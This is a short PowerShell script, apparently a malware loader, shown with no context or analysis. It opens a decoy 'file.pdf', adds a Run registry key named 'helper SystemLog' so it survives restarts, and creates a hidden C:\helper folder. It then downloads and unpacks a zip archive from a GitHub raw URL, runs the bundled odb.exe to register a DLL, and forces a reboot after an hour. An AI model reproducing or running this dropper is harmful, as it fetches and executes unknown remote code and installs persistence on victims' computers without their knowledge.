echo 1 > file.pdf ;
.\file.pdf ;
if (Test-Path C:\helper\log3.dll) { exit } 
else { 
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'C:\helper\odb.exe /a {REGSVR C:\helper\log4.dll}' -Force ;

powershell -w 1 New-Item -ItemType Directory -Force -Path 'C:\helper' | Out-Null ;
wget "https://github.com/citraadvertising/X/raw/refs/heads/main/pl.zip" -o C:\helper\pl.zip; start-sleep 3 ;
Expand-Archive -Path "C:\helper\pl.zip" -DestinationPath "C:\helper\" -Force ;

start-process C:\helper\odb.exe -Argument "REGSVR C:\helper\log4.dll" ;
start-sleep 3600 ; shutdown /r /t 300;
}
